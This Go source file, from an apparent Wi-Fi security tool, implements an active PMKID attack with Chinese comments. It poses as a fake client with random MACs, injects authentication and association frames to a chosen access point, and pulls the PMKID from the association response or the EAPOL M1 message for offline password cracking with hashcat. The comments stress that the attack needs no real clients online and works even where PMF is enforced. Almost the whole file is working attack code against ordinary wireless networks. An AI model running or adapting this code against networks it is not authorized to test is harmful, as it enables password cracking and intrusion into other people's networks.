// Package pmkid 实现主动 PMKID 获取：本机扮演"假客户端"，向目标 AP
// 发送 Open System 认证 + 关联请求，从关联响应 / EAPOL M1 的 RSN IE
// 中提取为本次会话生成的 PMKID。
//
// 与 deauth → 抓握手链路的本质区别：不依赖任何真实客户端在线，
// 也不受 PMF（802.11w，WPA3 强制）影响——假客户端自己发起关联，
// AP 的 PMKSA 缓存（802.11i 标准行为）会主动把 PMKID 送上门。
// SSID 与密码不变时 PMKID 长期不变，离线爆破一次抓取终身可用。
//
// 失败严格分类（Failure），上层据此给出可行动的提示：
// 换 MAC 重试、确认信道、放弃企业网，而不是笼统的"失败"。
package pmkid

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"time"

	"github.com/ctkqiang/wifisec/internal/eapol"
	"github.com/ctkqiang/wifisec/internal/ieee80211"
	"github.com/ctkqiang/wifisec/internal/rsnie"
)

// 默认参数：3 次尝试、单次 4 秒（覆盖两个信标周期 + 认证/关联/M1 往返）。
const (
	defaultAttempts       = 3
	defaultAttemptTimeout = 4 * time.Second
)

// 认证帧体字段语义（802.11 §9.3.3.1）。
// Open System 认证对任何 STA 一律成功，真正的准入控制在关联后的
// 4-way 握手——这是 PMKID 攻击无需口令就能走到 M1 的原因。
const (
	authAlgorithmOpen       = 0
	authTransactionResponse = 2
)

// FrameReader 是帧读取端口：实现方需自带超时粒度（capture.Source 满足），
// 返回的帧含 radiotap 头。
type FrameReader interface {
	Read() ([]byte, error)
}

// FrameWriter 是帧注入端口。
type FrameWriter interface {
	Write(frame []byte) error
}

// Failure 是 PMKID 获取的失败分类，字符串值可直接用于 --json 输出。
type Failure string

const (
	// FailureNoBeacon：目标信道上收不到 AP 信标（信道切换未生效/超距/掉线）。
	FailureNoBeacon Failure = "no-beacon"
	// FailureNoRSNIE：信标无 RSN IE——开放网络或 WEP，PMKID 无从谈起。
	FailureNoRSNIE Failure = "no-rsn-ie"
	// FailureNonPSK：AKM 非 PSK 家族（802.1X/SAE），PMKID 不可用于 PSK 爆破。
	FailureNonPSK Failure = "non-psk"
	// FailureRSNNoPMKID：握手流程走完但 AP 未返回 PMKID（PMKSA 缓存被关/固件裁剪）。
	FailureRSNNoPMKID Failure = "rsn-no-pmkid"
	// FailureAuthReject：认证被拒（MAC 过滤/AP 状态异常）。
	FailureAuthReject Failure = "auth-reject"
	// FailureAssocReject：关联被拒（AP 拒绝我们的能力集/负载满）。
	FailureAssocReject Failure = "assoc-reject"
	// FailureHiddenSSID：信标 SSID 为空——PMKID 爆破需要 ESSID 作 salt，不可行。
	FailureHiddenSSID Failure = "hidden-ssid"
	// FailureTimeout：流程中断在中间阶段（认证/关联后无响应）。
	FailureTimeout Failure = "timeout"
)

// Error 是带失败分类的 PMKID 获取错误。
type Error struct {
	Failure    Failure
	Detail     string
	Attempt    int
	AKMSummary string // FailureNonPSK 时的 AKM 判定说明
}

// Error 实现 error 接口：分类 + 尝试轮次 + 细节，文案可直接展示。
func (e *Error) Error() string {
	prefix := fmt.Sprintf("PMKID 获取失败（%s，第 %d 轮）", e.Failure, e.Attempt)
	if e.AKMSummary != "" {
		prefix += "：" + e.AKMSummary
	}
	if e.Detail != "" {
		return prefix + " · " + e.Detail
	}

	return prefix
}

// Result 是一次成功的 PMKID 提取结果。
type Result struct {
	PMKID       [16]byte
	PMKIDSHA256 bool   // AKM 00-0F-AC:6，hash 行 messagepair bit1 置位
	MACAP       string // 小写无冒号 hex
	MACSTA      string // 本次提取使用的假客户端 MAC
	ESSID       string
	ESSIDKnown  bool
	Channel     int
	RSSI        int // dBm，负值；无 radiotap 时为 0
	Attempt     int // 命中时的尝试轮次（从 1 起）
}

// Config 是一次主动获取会话的输入。零值字段取默认。
type Config struct {
	BSSID          string
	SSID           string
	Channel        int
	Reader         FrameReader
	Writer         FrameWriter
	SetChannel     func(channel int) error
	Attempts       int
	AttemptTimeout time.Duration
}

// Client 驱动"认证 → 关联 → 提取 PMKID"状态机。
type Client struct {
	config Config
}

// NewClient 归一化配置并建客户端。
func NewClient(config Config) *Client {
	if config.Attempts <= 0 {
		config.Attempts = defaultAttempts
	}
	if config.AttemptTimeout <= 0 {
		config.AttemptTimeout = defaultAttemptTimeout
	}

	return &Client{config: config}
}

// Run 执行全部尝试轮次：每轮换一个随机 STA MAC（重试换 MAC 让 AP 端
// 的 PMKSA/黑名单缓存失效），命中任一 PMKID 立即返回。
// 全部轮次失败时返回最后一轮的 *Error（含精确分类）。
func (c *Client) Run(ctx context.Context) (*Result, error) {
	bssid, err := net.ParseMAC(c.config.BSSID)
	if err != nil {
		return nil, fmt.Errorf("目标 BSSID %q 无法解析：%w", c.config.BSSID, err)
	}

	var lastErr error

	for attempt := 1; attempt <= c.config.Attempts; attempt++ {
		staMAC := randomSTAMAC()

		result, attemptErr := c.runAttempt(ctx, attempt, bssid, staMAC)
		if attemptErr == nil {
			result.Attempt = attempt
			result.MACAP = macHex(bssid)
			result.MACSTA = macHex(staMAC)

			return result, nil
		}

		var pmkidErr *Error
		if errors.As(attemptErr, &pmkidErr) {
			// 不可重试的分类：AP 能力层面的问题，换 MAC 无济于事。
			switch pmkidErr.Failure {
			case FailureNoRSNIE, FailureNonPSK, FailureHiddenSSID:
				return nil, attemptErr
			}
		}

		// ctx 取消等外部中断直接上抛，不再重试。
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}

		lastErr = attemptErr
	}

	return nil, lastErr
}

// attemptState 是单轮尝试的可变状态。
type attemptState struct {
	staMAC    net.HardwareAddr
	rsn       *rsnie.RSNInfo
	rsnRaw    []byte // beacon RSN IE 载荷（关联请求原样回显）
	essid     string
	rssi      int
	channel   int
	authOK    bool
	assocOK   bool
	sentAssoc bool
}

// runAttempt 执行单轮"等信标 → 认证 → 关联 → 提取 PMKID"状态机。
func (c *Client) runAttempt(ctx context.Context, attempt int, bssid, staMAC net.HardwareAddr) (*Result, *Error) {
	deadline := time.Now().Add(c.config.AttemptTimeout)

	// 信道切换失败是环境错误，给出可行动提示而不是笼统失败。
	if c.config.SetChannel != nil {
		if err := c.config.SetChannel(c.config.Channel); err != nil {
			return nil, &Error{
				Failure: FailureNoBeacon,
				Detail:  fmt.Sprintf("信道切换到 %d 失败：%v", c.config.Channel, err),
				Attempt: attempt,
			}
		}
	}

	// 发送认证帧在收到信标之后：beacon 之后的竞争窗口通常空闲，
	// 对齐信标节拍发送是无需退避定时器的自然节流。
	state := &attemptState{staMAC: staMAC, channel: c.config.Channel}
	authSent := false

	for {
		if err := ctx.Err(); err != nil {
			return nil, &Error{Failure: FailureTimeout, Detail: "已取消", Attempt: attempt}
		}
		if time.Now().After(deadline) {
			return nil, c.timeoutError(state, attempt)
		}

		frame, err := c.config.Reader.Read()
		if err != nil {
			// 读取超时是常态（capture 层 500ms 粒度），只有 ctx/致命错误才上抛。
			if ctx.Err() != nil {
				return nil, &Error{Failure: FailureTimeout, Detail: "已取消", Attempt: attempt}
			}
			continue
		}

		if result, ferr := c.consumeFrame(frame, state, bssid); ferr != nil {
			ferr.Attempt = attempt
			return nil, ferr
		} else if result != nil {
			return result, nil
		}

		// 信标到手且认证未发：完成能力校验后对齐信标发送认证。
		if state.rsn != nil && !authSent {
			authFrame, err := ieee80211.BuildAuthenticationFrame(state.staMAC, bssid)
			if err != nil {
				return nil, &Error{Failure: FailureTimeout, Detail: err.Error(), Attempt: attempt}
			}
			if err := c.config.Writer.Write(authFrame); err != nil {
				return nil, &Error{Failure: FailureTimeout, Detail: "注入认证帧失败：" + err.Error(), Attempt: attempt}
			}
			authSent = true
		}

		// 认证通过且关联未发：原样回显 AP 信标中的 RSN IE 构造关联请求，
		// 与真实客户端行为一致（多 SSID 虚拟 AP 会校验请求中的 SSID）。
		if state.authOK && !state.sentAssoc {
			assocFrame, err := ieee80211.BuildAssociationRequest(state.staMAC, bssid, state.essid, state.rsnRaw)
			if err != nil {
				return nil, &Error{Failure: FailureTimeout, Detail: err.Error(), Attempt: attempt}
			}
			if err := c.config.Writer.Write(assocFrame); err != nil {
				return nil, &Error{Failure: FailureTimeout, Detail: "注入关联请求失败：" + err.Error(), Attempt: attempt}
			}
			state.sentAssoc = true
		}
	}
}

// consumeFrame 按当前状态消化一帧：命中返回 Result，硬失败返回 *Error，
// 其余（无关帧/状态未到）返回 nil, nil。
func (c *Client) consumeFrame(frame []byte, state *attemptState, bssid net.HardwareAddr) (*Result, *Error) {
	body := frame
	if length, ok := ieee80211.RadioTapLen(frame); ok {
		body = frame[length:]
		if rssi, ok := ieee80211.ParseRadiotapSignal(frame); ok {
			state.rssi = rssi
		}
		if channel, ok := ieee80211.ParseRadiotapChannel(frame); ok && channel > 0 {
			state.channel = channel
		}
	}

	// 管理帧：信标（能力采集）与认证/关联响应（流程推进）。
	if info, err := ieee80211.ParseManagement(body); err == nil {
		if !bytes.EqualFold(info.Transmitter, bssid) {
			return nil, nil // 只认目标 AP 的帧
		}

		switch info.Subtype {
		case ieee80211.SubtypeBeacon, ieee80211.SubtypeProbeResp:
			return nil, c.collectBeacon(body, info, state)
		case ieee80211.SubtypeAuth:
			return c.consumeAuth(body, state)
		case ieee80211.SubtypeAssocResp:
			return c.consumeAssocResp(body, state)
		}

		return nil, nil
	}

	// 数据帧：只关心目标 AP 发来的 EAPOL M1（PMKID 的主要来源）。
	dataInfo, err := ieee80211.ParseData(body)
	if err != nil || dataInfo.EtherType != ieee80211.EtherTypeEAPOL {
		return nil, nil
	}
	if !bytes.EqualFold(dataInfo.Transmitter, bssid) {
		// M1 必然来自 AP；来自 STA 方向的 EAPOL 与本攻击无关。
		return nil, nil
	}

	return c.consumeEAPOLM1(dataInfo, state)
}

// collectBeacon 记录信标/探测响应中的 RSN IE、SSID，并做能力预检：
// 无 RSN IE、非 PSK、隐藏 SSID 三类直接判死——这些是 AP 能力层面的
// 问题，换 MAC 重试没有意义，立即终止为调用方省时间。
func (c *Client) collectBeacon(body []byte, info ieee80211.ManagementInfo, state *attemptState) *Error {
	// 信标每 ~100ms 一发：RSN 已采集则静默跳过，避免重复解析。
	if state.rsn != nil {
		return nil
	}

	// SSID 以空中广播为准；隐藏网络（信标长度为 0）回退用户显式指定的值。
	if info.SSID != "" {
		state.essid = info.SSID
	}

	rsnRaw, ok := ieee80211.FindElement(body, ieee80211.ElementRSN)
	if !ok {
		return &Error{Failure: FailureNoRSNIE, Detail: "信标未携带 RSN IE（开放网络或 WEP），PMKID 无从谈起"}
	}

	rsn, err := rsnie.ParseRSNIE(rsnRaw)
	if err != nil {
		// 畸形 RSN IE 不判死：等下一份信标或探测响应再试。
		return nil
	}

	if !rsn.IsPSK() {
		return &Error{Failure: FailureNonPSK, Detail: "该认证方式的 PMKID 与 PSK 字典无关，无法离线爆破", AKMSummary: rsn.AKMSummary()}
	}

	if state.essid == "" {
		if c.config.SSID != "" {
			state.essid = c.config.SSID
		} else {
			return &Error{Failure: FailureHiddenSSID, Detail: "信标 SSID 为空且无法恢复，hashcat 缺少 ESSID salt"}
		}
	}

	state.rsn = rsn
	state.rsnRaw = rsnRaw

	return nil
}

// consumeAuth 校验认证响应：只消费 AP 的应答（事务序号 2、状态码 0）。
// 我方发出的请求帧被驱动回环接收时事务序号为 1，天然被跳过。
// 状态码非 0 通常是 MAC 过滤或 AP 拒绝，可换 MAC 重试。
func (c *Client) consumeAuth(body []byte, state *attemptState) (*Result, *Error) {
	algorithm, transaction, status, err := ieee80211.ParseAuthentication(body)
	if err != nil {
		return nil, nil // 畸形帧忽略，等下一份
	}

	if algorithm != authAlgorithmOpen || transaction != authTransactionResponse {
		return nil, nil
	}

	if status != 0 {
		return nil, &Error{Failure: FailureAuthReject, Detail: fmt.Sprintf("认证状态码 %d（MAC 过滤或 AP 拒绝）", status)}
	}

	state.authOK = true

	return nil, nil
}

// consumeAssocResp 处理关联响应：状态码校验 + 次要提取路径。
// 部分 AP 在关联响应的 IE 区直接返回含 PMKID 的 RSN IE，
// 是 EAPOL M1 主路径之外的第一份机会。
func (c *Client) consumeAssocResp(body []byte, state *attemptState) (*Result, *Error) {
	if !state.authOK {
		return nil, nil // 认证未完成时的关联响应不属于本次流程
	}

	status, err := ieee80211.ParseAssociationResponse(body)
	if err != nil {
		return nil, nil
	}

	if status != 0 {
		return nil, &Error{Failure: FailureAssocReject, Detail: fmt.Sprintf("关联状态码 %d（能力集不符或 AP 负载满）", status)}
	}

	state.assocOK = true

	if rsnRaw, ok := ieee80211.FindElement(body, ieee80211.ElementRSN); ok {
		if result := c.extractPMKID(rsnRaw, state); result != nil {
			return result, nil
		}
	}

	return nil, nil
}

// consumeEAPOLM1 从 EAPOL M1 的 Key Data（RSN IE）提取 PMKID——
// 这是 PMKSA 缓存下发的主路径：AP 为新关联的 STA 生成 PMKID 后随
// M1 一并送达。M1 不受 PMF（802.11w）保护，因此该路径在强制 PMF
// 的网络上依然有效，这正是 PMKID 攻击的核心价值。
func (c *Client) consumeEAPOLM1(dataInfo ieee80211.DataFrameInfo, state *attemptState) (*Result, *Error) {
	key, err := eapol.ParseKey(dataInfo.Payload)
	if err != nil {
		return nil, nil // 非 EAPOL-Key 或畸形包体：静默忽略
	}
	if key.Message() != eapol.MessageM1 {
		return nil, nil // 只认 AP 下发的 M1
	}

	if rsnRaw, ok := ieee80211.FindElementInIEs(key.KeyData, ieee80211.ElementRSN); ok {
		if result := c.extractPMKID(rsnRaw, state); result != nil {
			return result, nil
		}
	}

	return nil, nil
}

// extractPMKID 从一份 RSN IE 载荷提取首个 PMKID，归一化为最终结果。
// IE 畸形或未携带 PMKID 返回 nil——这不是硬失败：其余来源仍有机会
// 命中，流程走完后由 timeoutError 给出精确分类（rsn-no-pmkid）。
func (c *Client) extractPMKID(rsnRaw []byte, state *attemptState) *Result {
	rsn, err := rsnie.ParseRSNIE(rsnRaw)
	if err != nil || !rsn.HasPMKID() {
		return nil
	}

	return &Result{
		PMKID:       rsn.PMKIDs[0],
		PMKIDSHA256: hasAKMSHA256(rsn),
		ESSID:       state.essid,
		ESSIDKnown:  state.essid != "",
		Channel:     state.channel,
		RSSI:        state.rssi,
	}
}

// hasAKMSHA256 报告 AKM 列表是否含 PSK-SHA256（00-0F-AC:6）。
// hashcat 22000 的 PMKID 行以 messagepair bit1 标注该变体（v7.1.2 规范）。
func hasAKMSHA256(info *rsnie.RSNInfo) bool {
	for _, akm := range info.AKMSuites {
		if akm.IsStandard() && akm.Type == rsnie.AKMTypePSKSHA256 {
			return true
		}
	}

	return false
}

// timeoutError 依据已推进到的阶段给出精确超时分类。
func (c *Client) timeoutError(state *attemptState, attempt int) *Error {
	switch {
	case state.rsn == nil:
		return &Error{Failure: FailureNoBeacon, Detail: fmt.Sprintf("信道 %d 上 %.1fs 内未收到目标信标", c.config.Channel, c.config.AttemptTimeout.Seconds()), Attempt: attempt}
	case !state.assocOK:
		return &Error{Failure: FailureTimeout, Detail: "关联后未收到 EAPOL M1", Attempt: attempt}
	default:
		return &Error{Failure: FailureRSNNoPMKID, Detail: "握手流程完整但 AP 未返回 PMKID（PMKSA 缓存可能被禁用）", Attempt: attempt}
	}
}

// randomSTAMAC 生成随机假客户端 MAC：置位本地管理位（bit1）、
// 清组播位（bit0），随机 OUI 避免与真实厂商设备冲突。
func randomSTAMAC() net.HardwareAddr {
	mac := make([]byte, 6)
	if _, err := rand.Read(mac); err != nil {
		// crypto/rand 失败在受支持平台上不应发生；兜底固定本地前缀。
		mac = []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01}
	}

	mac[0] = mac[0]&0xFE | 0x02

	return mac
}

// macHex 归一化 MAC 为小写无冒号 hex。
// 不用 fmt 的 %x：net.HardwareAddr 实现了 Stringer，%x 会先取
// String()（带冒号）再对字符串做 hex 编码，产出双倍长度的乱码。
func macHex(addr net.HardwareAddr) string {
	return hex.EncodeToString(addr)
}
